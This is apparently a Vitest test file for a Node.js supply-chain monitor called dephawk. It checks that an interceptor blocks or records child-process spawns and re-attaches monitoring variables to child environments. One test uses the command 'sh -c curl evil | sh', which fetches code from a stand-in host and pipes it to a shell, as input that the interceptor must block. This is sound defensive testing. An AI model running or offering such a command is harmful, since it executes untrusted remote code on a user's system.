import { describe, it, expect, afterEach, beforeEach } from 'vitest';
import childProcess from 'node:child_process';
import { ChildProcessInterceptor } from '../../../src/adapters/interceptors/child-process.interceptor.js';
import { EnvInterceptor } from '../../../src/adapters/interceptors/env.interceptor.js';
import type { Disposable } from '../../../src/application/ports.js';
import { recordSpy } from './spy.js';

const SPAWN_SENTINEL = { sentinel: 'spawn' };
let installed: Disposable | undefined;
let realSpawnSync: typeof childProcess.spawnSync;
let realExecFile: typeof childProcess.execFile;
let spawnCalls: unknown[][];
let execFileCalls: unknown[][];

// Both stubs go in before any interceptor is installed, so the interceptor
// patches the stub and `dispose` puts the stub back — not the real spawn.
beforeEach(() => {
  spawnCalls = [];
  execFileCalls = [];
  realSpawnSync = childProcess.spawnSync;
  realExecFile = childProcess.execFile;
  (childProcess as unknown as Record<string, unknown>)['spawnSync'] = (
    ...args: unknown[]
  ) => {
    spawnCalls.push(args);
    return SPAWN_SENTINEL;
  };
  (childProcess as unknown as Record<string, unknown>)['execFile'] = (
    ...args: unknown[]
  ) => {
    execFileCalls.push(args);
  };
});

afterEach(() => {
  installed?.dispose();
  installed = undefined;
  (childProcess as unknown as Record<string, unknown>)['spawnSync'] = realSpawnSync;
  (childProcess as unknown as Record<string, unknown>)['execFile'] = realExecFile;
});

describe('ChildProcessInterceptor', () => {
  it('catches a spawn and renders the full command line', () => {
    const spy = recordSpy();
    spy.deny('spawning not allowed');
    installed = new ChildProcessInterceptor().install(spy.record);

    expect(() => childProcess.spawnSync('sh', ['-c', 'curl evil | sh'])).toThrow(
      /dephawk: blocked/,
    );
    expect(spy.last?.capability).toBe('process.spawn');
    expect(spy.last?.detail).toBe('sh -c curl evil | sh');
    expect(spawnCalls).toHaveLength(0);
  });

  it('passes an allowed spawn through to the original', () => {
    const spy = recordSpy();
    installed = new ChildProcessInterceptor().install(spy.record);

    const result = childProcess.spawnSync('ls', ['-la']);
    expect(result).toBe(SPAWN_SENTINEL);
    expect(spy.last?.detail).toBe('ls -la');
    expect(spawnCalls).toHaveLength(1);
  });

  it('restores originals on dispose', () => {
    const patched = childProcess.spawnSync;
    const local = new ChildProcessInterceptor().install(recordSpy().record);
    expect(childProcess.spawnSync).not.toBe(patched);
    local.dispose();
    expect(childProcess.spawnSync).toBe(patched);
  });
});

describe('ChildProcessInterceptor — re-attaching monitoring', () => {
  // Re-attaching repairs `process.env` in place when the caller passed no env,
  // so these tests leave fabricated values behind unless they are undone.
  let savedEnv: NodeJS.ProcessEnv;
  beforeEach(() => {
    savedEnv = { ...process.env };
  });
  afterEach(() => {
    for (const key of Object.keys(process.env)) {
      if (!(key in savedEnv)) {
        delete process.env[key];
      }
    }
    Object.assign(process.env, savedEnv);
  });

  const REGISTER = 'file:///app/node_modules/dephawk/dist/register.js';
  // A fixed snapshot, so the test does not depend on the runner's environment.
  const monitored: NodeJS.ProcessEnv = {
    NODE_OPTIONS: `--import ${REGISTER}`,
    DEPHAWK_POLICY: '{"mode":"observe"}',
    PATH: '/usr/bin',
  };

  function install(): ReturnType<typeof recordSpy> {
    const spy = recordSpy();
    installed = new ChildProcessInterceptor({ env: monitored }).install(spy.record);
    return spy;
  }

  /** The options object the original spawn actually received. */
  function optionsOf(call: unknown[]): Record<string, unknown> {
    return (call.find(
      (arg) => typeof arg === 'object' && arg !== null && !Array.isArray(arg),
    ) ?? {}) as Record<string, unknown>;
  }

  it('puts monitoring back into a sanitised child environment', () => {
    const spy = install();

    childProcess.spawnSync('node', ['payload.js'], { env: { PATH: '/usr/bin' } });

    const env = optionsOf(spawnCalls[0]!)['env'] as NodeJS.ProcessEnv;
    expect(env['NODE_OPTIONS']).toBe(`--import ${REGISTER}`);
    expect(env['DEPHAWK_POLICY']).toBe('{"mode":"observe"}');
    expect(env['PATH']).toBe('/usr/bin');
    expect(spy.last?.detail).toContain('re-attached');
    expect(spy.last?.detail).toContain('NODE_OPTIONS');
  });

  it('leaves the rest of the options object untouched', () => {
    install();

    childProcess.spawnSync('node', ['x.js'], { cwd: '/srv', env: {}, shell: true });

    const options = optionsOf(spawnCalls[0]!);
    expect(options['cwd']).toBe('/srv');
    expect(options['shell']).toBe(true);
  });

  it('says nothing when the child already carries monitoring', () => {
    const spy = install();

    childProcess.spawnSync('node', ['x.js'], { env: { ...monitored } });

    expect(spy.last?.detail).toBe('node x.js');
    expect(spy.last?.detail).not.toContain('re-attached');
  });

  it('does not add an env when the caller passed none — the child inherits', () => {
    // Materialising a copy would both change the caller's semantics and read
    // every variable through the env interceptor's proxy.
    install();

    childProcess.spawnSync('node', ['x.js']);

    expect(optionsOf(spawnCalls[0]!)['env']).toBeUndefined();
  });

  it('finds the options object ahead of a callback argument', () => {
    install();

    childProcess.execFile('node', ['x.js'], { env: {} }, () => undefined);

    const call = execFileCalls[0]!;
    const env = optionsOf(call)['env'] as NodeJS.ProcessEnv;
    expect(env['NODE_OPTIONS']).toBe(`--import ${REGISTER}`);
    // The callback must stay last, or Node reads it as options.
    expect(typeof call[call.length - 1]).toBe('function');
  });

  it('does not re-attach to a spawn it refused', () => {
    const spy = recordSpy();
    spy.deny('spawning not allowed');
    installed = new ChildProcessInterceptor({ env: monitored }).install(spy.record);

    expect(() => childProcess.spawnSync('node', ['x.js'], { env: {} })).toThrow(
      /dephawk: blocked/,
    );
    expect(spawnCalls).toHaveLength(0);
  });
});

describe('ChildProcessInterceptor — reads made by the runtime', () => {
  it('does not report the caller for the env Node copies to build the child', () => {
    // `normalizeSpawnArguments` reads the whole of `process.env` to construct
    // the child's environment. Attributing that to the caller invents a finding
    // per secret in the environment — and, worse, a drafted policy that hands
    // the package every one of them.
    process.env['DEPHAWK_TEST_SECRET_TOKEN'] = 'x';
    const spy = recordSpy();
    const env = new EnvInterceptor().install(spy.record);
    installed = new ChildProcessInterceptor({ env: {} }).install(spy.record);

    try {
      // execFileSync, not the stubbed spawnSync: this needs Node's real
      // implementation to run, since that is what reads the environment.
      childProcess.execFileSync(process.execPath, ['-e', '1']);
    } finally {
      env.dispose();
      delete process.env['DEPHAWK_TEST_SECRET_TOKEN'];
    }

    expect(spy.calls.filter((c) => c.capability === 'process.spawn')).toHaveLength(1);
    expect(spy.calls.filter((c) => c.capability === 'env.read')).toHaveLength(0);
  });

  it('still reports a secret the caller reads itself before spawning', () => {
    process.env['DEPHAWK_TEST_SECRET_TOKEN'] = 'x';
    const spy = recordSpy();
    const env = new EnvInterceptor().install(spy.record);
    installed = new ChildProcessInterceptor({ env: {} }).install(spy.record);

    try {
      const secret = process.env['DEPHAWK_TEST_SECRET_TOKEN'];
      childProcess.execFileSync(process.execPath, ['-e', '1'], {
        env: { SECRET: secret ?? '' },
      });
    } finally {
      env.dispose();
      delete process.env['DEPHAWK_TEST_SECRET_TOKEN'];
    }

    const reads = spy.calls.filter((c) => c.capability === 'env.read');
    expect(reads.map((c) => c.detail)).toEqual(['DEPHAWK_TEST_SECRET_TOKEN']);
  });
});
